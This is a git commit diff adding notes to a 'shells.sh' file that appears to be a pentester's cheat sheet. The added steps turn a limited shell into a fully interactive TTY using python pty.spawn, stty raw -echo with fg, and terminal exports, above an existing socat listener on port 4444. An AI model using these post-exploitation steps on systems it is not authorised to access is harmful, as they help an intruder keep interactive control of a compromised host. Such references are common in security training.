8672bba6d1c87198535d325fb33752599e3c881f
DrDoomScroll <8130200+DrDoomScroll@users.noreply.github.com>
2021-10-01 07:31:49 -0700

    Added more steps

--- shells.sh
+++ shells.sh
@@ -1,3 +1,37 @@
+#######
+# Upgrade a dumb shell to partial interactive
+#######
+
+# Python 2 
+    python -c 'import pty; pty.spawn("/bin/bash")'  
+# Python 3
+    python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+
+#######
+# Upgrade partial to full TTY
+#######
+
+# get your current terminal size (rows and columns)
+stty size
+
+# for bash/sh (enter raw mode and disable echo'ing)
+stty raw -echo
+fg
+
+# for zsh (enter raw mode and disable echo'ing)
+stty raw -echo; fg
+
+reset
+export SHELL=bash
+export TERM=xterm
+stty rows <num> columns <cols>   # <num> and <cols> values found above by 'stty size'
+
+
+#######
+# socat full TTY
+#######
+
 # SOCAT (Full TTY)
     # Listener
     socat file:`tty`,raw,echo=0 tcp-listen:4444
